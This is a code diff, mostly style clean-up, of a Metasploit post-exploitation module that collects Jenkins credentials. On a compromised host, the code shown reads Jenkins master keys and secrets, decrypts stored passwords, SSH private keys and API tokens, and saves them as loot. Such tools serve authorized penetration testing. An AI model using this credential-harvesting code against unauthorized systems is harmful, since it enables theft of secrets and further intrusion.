@@ -9,23 +9,27 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Linux::System
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name' => 'Jenkins Credential Collector',
-      'Description' => %q(
-        This module can be used to extract saved Jenkins credentials, user
-        tokens, SSH keys, and secrets. Interesting files will be stored in
-        loot along with combined csv output.
-      ),
-      'License' => MSF_LICENSE,
-      'Author' => [ 'thesubtlety' ],
-      'Platform' => [ 'linux', 'win' ],
-      'SessionTypes' => %w[shell meterpreter]
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Jenkins Credential Collector',
+        'Description' => %q{
+          This module can be used to extract saved Jenkins credentials, user
+          tokens, SSH keys, and secrets. Interesting files will be stored in
+          loot along with combined csv output.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'thesubtlety' ],
+        'Platform' => [ 'linux', 'win' ],
+        'SessionTypes' => %w[shell meterpreter]
+      )
+    )
     register_options(
-      [  OptBool.new('STORE_LOOT', [false, 'Store files in loot (will simply output file to console if set to false).', true]),
-         OptBool.new('SEARCH_JOBS', [false, 'Search through job history logs for interesting keywords. Increases runtime.', false])
-      ])
+      [
+        OptBool.new('STORE_LOOT', [false, 'Store files in loot (will simply output file to console if set to false).', true]),
+        OptBool.new('SEARCH_JOBS', [false, 'Search through job history logs for interesting keywords. Increases runtime.', false])
+      ]
+    )
 
     @nodes = []
     @creds = []
@@ -34,7 +38,8 @@ class MetasploitModule < Msf::Post
   end
 
   def report_creds(user, pass)
-    return if user.empty? || pass.empty?
+    return if user.blank? || pass.blank?
+
     credential_data = {
       origin_type: :session,
       post_reference_name: self.fullname,
@@ -78,7 +83,7 @@ class MetasploitModule < Msf::Post
       passphrase = decrypt(passphrase)
       private_key = node.xpath("//privateKeySource//privateKey").text
       private_key = decrypt(private_key) if !private_key.match?(/----BEGIN/)
-      print_good("SSH Key found! ID: #{cred_id} Passphrase: #{passphrase || '<empty>' } Username: #{username} Description: #{description}")
+      print_good("SSH Key found! ID: #{cred_id} Passphrase: #{passphrase || '<empty>'} Username: #{username} Description: #{description}")
 
       store_loot("ssh-#{cred_id}", 'text/plain', session, private_key, nil, nil) if datastore['STORE_LOOT']
       @ssh_keys << [cred_id, description, passphrase, username, private_key]
@@ -107,7 +112,7 @@ class MetasploitModule < Msf::Post
     fname = file.tr("\\", "/").split('/')[-2]
     vprint_status("Parsing user #{fname}...")
 
-    username  = ""
+    username = ""
     api_token = ""
     xml_doc = Nokogiri::XML(f)
     xml_doc.xpath("//user").each do |node|
@@ -118,11 +123,12 @@ class MetasploitModule < Msf::Post
       api_token = decrypt(node.xpath("apiToken").text)
     end
 
-    print_good("API Token found - Username: #{username} Token: #{api_token}")
-
-    @api_tokens << [username, api_token]
-    report_creds(username, api_token)
-    store_loot("user-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
+    if api_token
+      print_good("API Token found - Username: #{username} Token: #{api_token}")
+      @api_tokens << [username, api_token]
+      report_creds(username, api_token)
+      store_loot("user-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
+    end
   end
 
   def parse_nodes(file)
@@ -130,10 +136,10 @@ class MetasploitModule < Msf::Post
     fname = file.tr("\\", "/").split('/')[-2]
     vprint_status("Parsing node #{fname}...")
 
-    node_name   = ""
+    node_name = ""
     description = ""
-    host    = ""
-    port    = ""
+    host = ""
+    port = ""
     cred_id = ""
     xml_doc = Nokogiri::XML(f)
     xml_doc.xpath("//slave").each do |node|
@@ -173,8 +179,8 @@ class MetasploitModule < Msf::Post
 
   def pretty_print_gathered
     creds_table = Rex::Text::Table.new(
-      'Header'  => 'Creds',
-      'Indent'  => 1,
+      'Header' => 'Creds',
+      'Indent' => 1,
       'Columns' =>
         [
           'Username',
@@ -187,8 +193,8 @@ class MetasploitModule < Msf::Post
     store_loot('all.creds.csv', 'text/plain', session, creds_table.to_csv, nil, nil) if datastore['STORE_LOOT']
 
     api_table = Rex::Text::Table.new(
-      'Header'  => 'API Keys',
-      'Indent'  => 1,
+      'Header' => 'API Keys',
+      'Indent' => 1,
       'Columns' =>
         [
           'Username',
@@ -200,8 +206,8 @@ class MetasploitModule < Msf::Post
     store_loot('all.apitokens.csv', 'text/plain', session, api_table.to_csv, nil, nil) if datastore['STORE_LOOT']
 
     node_table = Rex::Text::Table.new(
-      'Header'  => 'Nodes',
-      'Indent'  => 1,
+      'Header' => 'Nodes',
+      'Indent' => 1,
       'Columns' =>
         [
           'Node Name',
@@ -289,8 +295,8 @@ class MetasploitModule < Msf::Post
     end
 
     if exists?(master_key_path) && exists?(hudson_secret_key_path)
-      @master_key = read_file(master_key_path).strip
-      @hudson_secret_key = read_file(hudson_secret_key_path).strip
+      @master_key = read_file(master_key_path)
+      @hudson_secret_key = read_file(hudson_secret_key_path)
 
       if datastore['STORE_LOOT']
         loot_path = store_loot('master.key', 'application/octet-stream', session, @master_key)
@@ -360,6 +366,7 @@ class MetasploitModule < Msf::Post
 
     salted_final = intermediate.update(hudson_secret_key) + intermediate.final
     raise 'no magic key in a' if !salted_final.include?(magic)
+
     salted_final[0..15]
   end
 
@@ -417,6 +424,7 @@ class MetasploitModule < Msf::Post
 
   def decrypt(encrypted)
     return if encrypted.empty?
+
     if encrypted[0] == "{" && encrypted[-1] == "}"
       decrypt_v2(encrypted)
     else
